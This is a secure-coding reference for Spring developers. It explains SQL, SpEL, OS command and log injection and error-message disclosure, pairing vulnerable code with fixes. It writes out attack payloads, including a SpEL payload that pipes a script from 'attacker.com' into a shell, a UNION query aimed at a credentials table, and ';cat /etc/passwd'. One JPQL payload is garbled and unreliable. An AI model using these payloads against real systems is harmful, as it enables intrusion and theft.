# CWE Reference — §05 Injection

CWEs extracted from `docs/05-injection.md` with developer-focused comments.

---

## CWE-89 — SQL Injection

**Why it matters:** SQL injection is the most critical web vulnerability. When user input is concatenated into SQL queries, an attacker can read, modify, or delete any data in the database, bypass all application logic, and in some configurations (with `xp_cmdshell` on MSSQL or `COPY TO PROGRAM` on PostgreSQL) achieve Remote Code Execution on the database server.

**Attack vector in Spring:**
```java
// VULNERABLE — string concatenation in JDBC query
@GetMapping("/subscriptions")
public ResponseEntity<?> list(@RequestParam String email) {
    String sql = "SELECT * FROM subscriptions WHERE email = '" + email + "'";
    // Attacker sends: email=x' OR '1'='1
    // Returns ALL subscriptions
    // Or: email=x' UNION SELECT service_name,env,api_key,1 FROM integration_credentials--
    // Leaks database credentials
    return ResponseEntity.ok(jdbcTemplate.queryForList(sql));
}

// VULNERABLE — JPQL concatenation
@GetMapping("/jpa")
public ResponseEntity<?> jpaSearch(@RequestParam String plan) {
    String jpql = "SELECT s FROM Subscription s WHERE plan = '" + plan + "'";
    // Attacker sends: plan='; Subscription s = em.createQuery("DELETE FROM Subscription", Subscription.class).executeUpdate(); '
    return ResponseEntity.ok(em.createQuery(jpql).getResultList());
}

// VULNERABLE — LIKE with unescaped wildcards
@GetMapping("/search")
public ResponseEntity<?> search(@RequestParam String q) {
    String sql = "SELECT * FROM subscriptions WHERE plan LIKE '%" + q + "%'";
    // Attacker sends: q=%
    // Returns ALL rows (SQL wildcard %)
    return ResponseEntity.ok(jdbcTemplate.queryForList(sql));
}
```

**How to prevent:**
```java
// SAFE — bound parameters for WHERE clauses
@GetMapping("/subscriptions")
public ResponseEntity<?> list(@RequestParam String email) {
    return ResponseEntity.ok(
        jdbcTemplate.queryForList(
            "SELECT * FROM subscriptions WHERE email = ?",
            String.class, email
        )
    );
}

// SAFE — JPQL named parameters
@GetMapping("/jpa")
public ResponseEntity<?> jpaSearch(@RequestParam String plan) {
    return ResponseEntity.ok(
        em.createQuery("SELECT s FROM Subscription s WHERE plan = :plan", Subscription.class)
          .setParameter("plan", plan)
          .getResultList()
    );
}

// SAFE — LIKE with escaping + ESCAPE clause
@GetMapping("/search")
public ResponseEntity<?> search(@RequestParam String q) {
    String escaped = q.replace("\\", "\\\\").replace("%", "\\%").replace("_", "\\_");
    return ResponseEntity.ok(
        jdbcTemplate.queryForList(
            "SELECT * FROM subscriptions WHERE plan LIKE ? ESCAPE '\\'",
            "%" + escaped + "%"
        )
    );
}
```
- For `ORDER BY`, use an allow-list (CWE-89 variant — identifiers cannot be bound).
- Database user should have least privilege — no DDL, no access to credential tables.

---

## CWE-917 — Improper Neutralization of Special Elements used in an Expression Language (SpEL Injection)

**Why it matters:** Spring Expression Language (SpEL) is a full-featured expression language that can call any Java method, access any bean, and execute arbitrary code. When user input reaches the SpEL parser, an attacker can invoke `T(Runtime).getRuntime().exec("malicious")` and achieve full Remote Code Execution.

**Attack vector in Spring:**
```java
// VULNERABLE — user input reaches SpEL parser
@GetMapping("/report")
public ResponseEntity<?> report(@RequestParam String expr) {
    ExpressionParser parser = new SpelExpressionParser();
    StandardEvaluationContext context = new StandardEvaluationContext();
    // Attacker sends: expr=T(Runtime).getRuntime().exec("id")
    Object result = parser.parseExpression(expr).getValue(context);
    return ResponseEntity.ok(result);
}
```
Payload: `T(java.lang.Runtime).getRuntime().exec("curl http://attacker.com/shell.sh | sh")` — RCE.

**How to prevent:**
- Never pass user input to a SpEL parser. Use a registry of pre-defined templates:
```java
// SAFE — registry of allowed templates, evaluated in read-only context
@GetMapping("/report")
public ResponseEntity<?> report(@RequestParam String template) {
    Map<String, String> TEMPLATES = Map.of(
        "basic", "subscription.plan + ' - ' + subscription.status",
        "detailed", "subscription.plan + ': ' + subscription.status + ' (expires: ' + subscription.expiry + ')'"
    );
    String expression = TEMPLATES.get(template);
    if (expression == null) {
        return ResponseEntity.badRequest().body("Unknown template");
    }
    
    // Use SimpleEvaluationContext — read-only, no type references, no method calls
    ExpressionParser parser = new SpelExpressionParser();
    SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
    Object result = parser.parseExpression(expression).getValue(context, subscription);
    return ResponseEntity.ok(result);
}
```
- `SimpleEvaluationContext` blocks `T(...)`, method calls, property writes, and constructor calls.

---

## CWE-78 — Improper Neutralization of Special Elements used in an OS Command (Command Injection)

**Why it matters:** When user input is concatenated into an OS command string and executed via `Runtime.exec()` or `ProcessBuilder` with a shell (`sh -c`), an attacker can execute arbitrary system commands — read files, exfiltrate data, install backdoors, pivot to internal networks.

**Attack vector in Spring:**
```java
// VULNERABLE — shell-composed command string
@PostMapping("/tools/ping")
public ResponseEntity<?> ping(@RequestParam String host) {
    // Attacker sends: host=127.0.0.1;id
    // Executes: ping -c 4 "127.0.0.1;id"
    // The ;id runs after ping, returning system user info
    Process p = Runtime.getRuntime().exec("ping -c 4 " + host);
    return ResponseEntity.ok(
        new String(p.getInputStream().readAllBytes())
    );
}
```
Payload: `?host=127.0.0.1;cat /etc/passwd` — reads system files.

**How to prevent:**
- Use `ProcessBuilder` with separate argv elements (no shell):
```java
// SAFE — no shell, validated input
@PostMapping("/tools/ping")
public ResponseEntity<?> ping(@RequestParam String host) {
    // Validate: must be a valid IPv4 or hostname
    if (!host.matches("^[a-zA-Z0-9._-]+$")) {
        return ResponseEntity.badRequest().body("Invalid host");
    }
    
    // ProcessBuilder with separate args — no shell interpretation
    ProcessBuilder pb = new ProcessBuilder("ping", "-c", "4", host);
    pb.redirectErrorStream(true);
    Process p = pb.start();
    
    String output = new String(p.getInputStream().readAllBytes());
    p.waitFor(5, TimeUnit.SECONDS);  // timeout
    return ResponseEntity.ok(output);
}
```
- Never use `sh -c` or `cmd /c` with user input.
- Set timeouts on process execution.

---

## CWE-117 — Improper Neutralization of Log Injection Characters (CRLF Injection / Log Forging)

**Why it matters:** When user input containing CR (`\r`) or LF (`\n`) characters is written to logs without sanitization, an attacker can forge log entries. In structured JSON logging, a newline breaks the JSON structure, allowing the attacker to inject arbitrary JSON fields (e.g., `"level": "INFO"`, `"user": "admin"`) that can hide attacks, create false audit trails, or poison log aggregation systems.

**Attack vector in Spring:**
```java
// VULNERABLE — user input written to log without sanitization
@PostMapping("/audit/message")
public ResponseEntity<?> logMessage(@RequestParam String message) {
    log.info("User message: {}", message);
    // Attacker sends: message=\r\n{"level":"INFO","user":"admin"}
    // This forges a log entry that looks like an admin action
    return ResponseEntity.ok("logged");
}
```
Payload: `message=%0d%0a{"level":"INFO","user":"admin"}` — injects a fake JSON log entry.

**How to prevent:**
- Strip CR/LF/NUL from log input:
```java
// SAFE — sanitize before logging
@PostMapping("/audit/message")
public ResponseEntity<?> logMessage(@RequestParam String message) {
    String sanitized = message.replaceAll("[\\r\\n\\x00]", "");
    log.info("User message: {}", sanitized);
    return ResponseEntity.ok("logged");
}
```
- Use structured JSON logging (Logback JSON encoder) which escapes special characters automatically.
- Implement a `CorrelationIdFilter` that sanitizes correlation IDs for log use.

---

## CWE-209 — Information Exposure Through Error Messages

**Why it matters:** Detailed error messages (stack traces, SQL errors, framework internals) reveal the technology stack, database schema, query structure, and internal architecture. This information helps attackers craft targeted exploits — e.g., a PostgreSQL error message reveals the database version and schema, enabling schema-specific injection attacks.

**Attack vector in Spring:**
```java
// VULNERABLE — stack trace returned in HTTP response
@GetMapping("/boom")
public ResponseEntity<?> boom() {
    throw new RuntimeException("Database connection failed: relation \"integration_credentials\" does not exist");
    // Returns: {"timestamp":"...","status":500,"error":"Internal Server Error",
    //          "message":"Database connection failed: relation..."}
    // Plus: stack trace with full class names, line numbers, package structure
}

// VULNERABLE — SQL error text returned to caller
@GetMapping("/list")
public ResponseEntity<?> list(@RequestParam String sort) {
    // Attacker sends malformed sort → SQL error → error text returned
    String sql = "SELECT * FROM subscriptions ORDER BY " + sort;
    return ResponseEntity.ok(jdbcTemplate.queryForList(sql));
    // Returns: "You have an error in your SQL syntax near 'DROP TABLE' at line 1"
}
```

**How to prevent:**
- Configure Spring to never include stack traces or detailed messages:
```yaml
# application-prod.yml
server:
  error:
    include-stacktrace: never
    include-message: never
    include-binding-errors: never
```
- Use a global exception handler:
```java
// SAFE — generic problem detail
@RestControllerAdvice
public class SafeApiExceptionHandler {
    
    @ExceptionHandler(Exception.class)
    public ResponseEntity<ProblemDetail> handle(Exception e) {
        ProblemDetail problem = ProblemDetail.forStatusAndDetail(
            HttpStatus.INTERNAL_SERVER_ERROR,
            "An internal error occurred. Incident ID: " + generateIncidentId()
        );
        // Log the full details server-side, return generic to caller
        log.error("Error: {}", e.getMessage(), e);
        return ResponseEntity.of(problem).build();
    }
}
```

---

## CWE-204 — Observable Response Discrepancy (SQL Internals Exposed)

**Why it matters:** When error responses reveal database internals (table names, column names, query structure), an attacker gains a detailed map of the data model. This turns a generic SQL error into a schema disclosure vulnerability, enabling targeted UNION injection and data exfiltration.

**Attack vector in Spring:**
```java
// VULNERABLE — DB error text returned to caller
@GetMapping("/report")
public ResponseEntity<?> report(@RequestParam long id) {
    try {
        return ResponseEntity.ok(jdbcTemplate.queryForObject(
            "SELECT * FROM subscriptions WHERE id = " + id,  // also SQLi!
            Subscription.class
        ));
    } catch (Exception e) {
        // Returns: "column \"subscription_id\" does not exist"
        // Attacker learns column names from the error
        return ResponseEntity.status(500).body(Map.of("error", e.getMessage()));
    }
}
```

**How to prevent:**
- Same as CWE-209: generic error responses, detailed logging server-side.
- Use a correlation/incident ID in the response so the caller can look up details separately.
